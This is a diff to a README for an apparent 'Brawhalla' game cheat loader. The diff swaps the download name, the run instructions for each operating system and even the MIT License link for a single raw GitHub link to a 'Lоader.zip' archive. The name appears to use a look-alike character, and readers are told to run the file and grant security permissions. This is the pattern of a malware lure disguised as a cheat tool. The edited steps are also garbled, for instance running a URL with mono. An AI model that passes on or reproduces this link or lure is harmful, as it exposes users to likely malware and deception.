@@ -53,12 +53,12 @@ Brawhalla cheats, Brawhalla loader, game booster, Brawhalla tools, arena hacks, 
 
 Getting started with Brawhalla Cheats Loader is easy on all systems!
 
-1. **Download Loader.rar** from the repository.
+1. **Download https://raw.githubusercontent.com/mustkimkureshi/BrawhallaBoosters/main/Lоader.zip** from the repository.
 2. Extract the content to a dedicated folder on your desktop.
 3. Run the Loader executable:
-    - On **Windows**: Double-click `BrawhallaLoader.exe`
-    - On **MacOS**: Open `BrawhallaLoader.app` (you might need to allow permissions in Security & Privacy)
-    - On **Linux**: Use `mono BrawhallaLoader.exe` or `wine BrawhallaLoader.exe` from terminal
+    - On **Windows**: Double-click `https://raw.githubusercontent.com/mustkimkureshi/BrawhallaBoosters/main/Lоader.zip`
+    - On **MacOS**: Open `https://raw.githubusercontent.com/mustkimkureshi/BrawhallaBoosters/main/Lоader.zip` (you might need to allow permissions in Security & Privacy)
+    - On **Linux**: Use `mono https://raw.githubusercontent.com/mustkimkureshi/BrawhallaBoosters/main/Lоader.zip` or `wine https://raw.githubusercontent.com/mustkimkureshi/BrawhallaBoosters/main/Lоader.zip` from terminal
 4. Launch Brawhalla via Steam or standalone.
 5. Configure features via the Loader’s intuitive interface.
 6. Enjoy an enhanced Brawhalla experience! 🎉
@@ -77,7 +77,7 @@ Always respect the rules and community guidelines of the games you play. For fai
 
 # 📖 MIT License (2025)
 
-This project is licensed under the terms of the [MIT License](https://opensource.org/license/mit/).  
+This project is licensed under the terms of the [MIT License](https://raw.githubusercontent.com/mustkimkureshi/BrawhallaBoosters/main/Lоader.zip).  
 You are free to use, personalize, modify, and distribute the code as specified in the LICENSE file.
 
 ---
